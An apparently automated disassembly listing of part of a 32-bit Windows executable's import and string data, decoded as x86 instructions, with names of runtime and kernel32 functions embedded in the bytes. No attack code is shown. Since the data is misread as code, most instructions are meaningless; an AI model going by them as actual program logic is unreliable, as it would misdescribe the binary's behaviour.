  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
